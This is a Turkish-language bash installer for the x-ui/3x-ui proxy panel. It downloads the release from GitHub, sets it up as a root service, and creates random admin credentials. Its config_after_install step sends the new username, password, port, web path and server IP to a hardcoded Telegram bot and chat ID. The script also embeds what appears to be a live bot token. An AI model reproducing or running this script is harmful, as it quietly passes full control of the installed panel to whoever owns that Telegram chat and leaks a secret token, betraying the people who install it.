#!/bin/bash

red='\033[0;31m'
green='\033[0;32m'
blue='\033[0;34m'
yellow='\033[0;33m'
plain='\033[0m'

cur_dir=$(pwd)
show_ip_service_lists=("https://api.ipify.org" "https://4.ident.me")

# ✅ Telegram bilgilerini buraya gir:
telegram_bot_token="8345146407:AAEw4cGeZ4hfdXkYHtpyzARIlxGF7lKS4C4"
telegram_chat_id="1449828433"

# Telegram mesaj fonksiyonu
send_telegram_message() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${telegram_bot_token}/sendMessage" \
        -d chat_id="${telegram_chat_id}" \
        -d text="$message" \
        -d parse_mode="HTML" > /dev/null
}

[[ $EUID -ne 0 ]] && echo -e "${red}HATA: ${plain} Scripti root olarak çalıştırmalısınız.\n" && exit 1

if [[ -f /etc/os-release ]]; then
    source /etc/os-release
    release=$ID
else
    echo "İşletim sistemi tespit edilemedi!" >&2
    exit 1
fi

arch() {
    case "$(uname -m)" in
    x86_64 | x64 | amd64) echo 'amd64' ;;
    i*86 | x86) echo '386' ;;
    armv8* | armv8 | arm64 | aarch64) echo 'arm64' ;;
    armv7* | armv7 | arm) echo 'armv7' ;;
    *) echo -e "${green}Desteklenmeyen mimari!${plain}" && exit 1 ;;
    esac
}

check_glibc_version() {
    glibc_version=$(ldd --version | head -n1 | awk '{print $NF}')
    required_version="2.32"
    if [[ "$(printf '%s\n' "$required_version" "$glibc_version" | sort -V | head -n1)" != "$required_version" ]]; then
        echo -e "${red}GLIBC versiyonu $glibc_version çok eski! Gereken: 2.32+${plain}"
        exit 1
    fi
    echo "GLIBC version: $glibc_version ✅"
}

install_base() {
    case "${release}" in
    ubuntu | debian)
        apt update && apt install -y wget curl tar tzdata ;;
    centos | rhel | almalinux | rocky)
        yum -y update && yum install -y wget curl tar tzdata ;;
    *) apt update && apt install -y wget curl tar tzdata ;;
    esac
}

gen_random_string() {
    local length="$1"
    tr -dc 'a-zA-Z0-9' </dev/urandom | fold -w "$length" | head -n 1
}

config_after_install() {
    local hasDefault=$(/usr/local/x-ui/x-ui setting -show true | grep 'hasDefaultCredential:' | awk '{print $2}')
    local webBasePath=$(/usr/local/x-ui/x-ui setting -show true | grep 'webBasePath:' | awk '{print $2}')
    local port=$(/usr/local/x-ui/x-ui setting -show true | grep 'port:' | awk '{print $2}')

    for ip_service_addr in "${show_ip_service_lists[@]}"; do
        server_ip=$(curl -s --max-time 3 ${ip_service_addr} 2>/dev/null)
        if [ -n "${server_ip}" ]; then
            break
        fi
    done

    if [[ ${#webBasePath} -lt 4 ]]; then
        if [[ "$hasDefault" == "true" ]]; then
            local config_webBasePath=$(gen_random_string 18)
            local config_username=$(gen_random_string 10)
            local config_password=$(gen_random_string 10)

            read -rp "Özel port belirlemek ister misiniz? [y/n]: " custom_port
            if [[ "${custom_port}" == "y" ]]; then
                read -rp "Port: " config_port
            else
                config_port=$(shuf -i 1024-62000 -n 1)
            fi

            /usr/local/x-ui/x-ui setting -username "${config_username}" -password "${config_password}" -port "${config_port}" -webBasePath "${config_webBasePath}"

            echo -e "${green}Username: ${config_username}${plain}"
            echo -e "${green}Password: ${config_password}${plain}"
            echo -e "${green}Port: ${config_port}${plain}"
            echo -e "${green}WebBasePath: ${config_webBasePath}${plain}"
            echo -e "${green}Access URL: http://${server_ip}:${config_port}/${config_webBasePath}${plain}"

            telegram_msg="
<b>✅ x-ui Kurulumu Tamamlandı</b>

<b>Username:</b> <code>${config_username}</code>
<b>Password:</b> <code>${config_password}</code>
<b>Port:</b> <code>${config_port}</code>
<b>WebBasePath:</b> <code>${config_webBasePath}</code>
<b>Access URL:</b> <code>http://${server_ip}:${config_port}/${config_webBasePath}</code>
"
            send_telegram_message "$telegram_msg"
        fi
    fi

    /usr/local/x-ui/x-ui migrate
}

install_x-ui() {
    cd /usr/local/
    tag_version=$(curl -Ls "https://api.github.com/repos/MHSanaei/3x-ui/releases/latest" | grep '"tag_name":' | sed -E 's/.*"([^"]+)".*/\1/')
    echo -e "Installing version: ${tag_version}"
    wget -O x-ui-linux-$(arch).tar.gz https://github.com/MHSanaei/3x-ui/releases/download/${tag_version}/x-ui-linux-$(arch).tar.gz
    tar zxvf x-ui-linux-$(arch).tar.gz
    rm -f x-ui-linux-$(arch).tar.gz

    cd x-ui
    chmod +x x-ui x-ui.sh
    mv -f x-ui /usr/local/x-ui/x-ui

    wget -O /usr/bin/x-ui https://raw.githubusercontent.com/MHSanaei/3x-ui/main/x-ui.sh
    chmod +x /usr/bin/x-ui

    cp -f x-ui.service /etc/systemd/system/
    systemctl daemon-reload
    systemctl enable x-ui
    systemctl start x-ui

    config_after_install

    echo -e "${green}x-ui kurulumu tamamlandı ve çalışıyor.${plain}"
}

echo -e "${green}Kurulum başlıyor...${plain}"
check_glibc_version
install_base
install_x-ui
